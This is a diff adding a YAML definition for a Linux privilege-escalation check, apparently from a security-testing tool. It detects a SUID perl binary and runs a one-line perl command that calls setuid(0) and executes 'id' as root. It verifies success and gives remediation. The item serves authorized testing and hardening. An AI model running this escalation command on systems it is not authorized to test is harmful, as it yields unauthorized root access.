@@ -1,0 +1,25 @@
+# SUID perl → root (GTFOBins)
+technique: T1548.001
+name: SUID perl → root (GTFOBins)
+tactic: [privilege-escalation]
+platform: [linux]
+ranking:
+  exploitability: high
+  safety: read-only
+  detection: quiet
+detect:
+  suid: perl
+execute:
+  command: "{{binary}} -e 'use POSIX qw(setuid);POSIX::setuid(0);system(\"id\");'"
+verify:
+  success: "uid=0"
+cleanup:
+  command: ""
+report:
+  vector_type: gtfobins_suid
+  description: >
+    SUID Perl reasserts the SUID EUID via POSIX::setuid(0) and shells
+    out as root. Same shape as SUID Python.
+  remediation: >
+    Remove the SUID bit from perl.
+  refs: [T1548.001, GTFOBins/perl]
